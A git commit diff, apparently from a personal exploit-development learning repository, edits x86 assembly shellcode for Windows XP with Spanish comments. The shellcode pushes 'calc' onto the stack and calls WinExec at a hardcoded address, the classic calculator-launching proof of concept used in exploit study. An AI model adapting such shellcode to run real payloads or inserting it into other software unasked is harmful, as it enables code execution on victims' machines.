6c9412834e88f49372825472bb01a7612a97552d
juzzrespecter <danisarp@gmail.com>
2022-07-26 18:58:14 +0200

    ...

--- WinXP/shellcode/shellcode.s
+++ WinXP/shellcode/shellcode.s
@@ -6,6 +6,6 @@ _payload:
 	push	eax		; null byte && uCmdShow
 	mov	ebx,0x636c6163	; 'calc'...
 	push	ebx		; ..a la pila
-	mov	ebx,esp		; ptr a 'calc' en la pila
-	push	ebx	   	; lpCmdLine = PTR 'calc.exe'
-	call	0x7c8623ad	; call ptr to  WinExec (check with arwin.exe)
+	push	esp	   	; lpCmdLine = PTR 'calc.exe'
+	mov	eax,0x7c8623ad	; PTR WinExec (via arwin.exe)
+	call	0x7c8623ad
